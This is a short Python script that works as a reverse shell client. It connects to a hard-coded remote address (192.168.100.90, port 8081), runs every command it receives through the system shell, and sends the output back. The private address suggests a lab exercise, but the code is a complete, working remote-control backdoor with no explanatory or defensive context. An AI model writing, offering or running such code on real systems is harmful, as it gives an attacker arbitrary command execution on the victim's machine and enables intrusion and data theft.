# Imports
from ctypes.wintypes import INT
import socket
import subprocess

# Setting Up IP/Sockets
REMOTE_HOST = '192.168.100.90' 
REMOTE_PORT = 8081 # 2222
client = socket.socket()

# Initializing Connection
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

# Runtime Loop
while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)
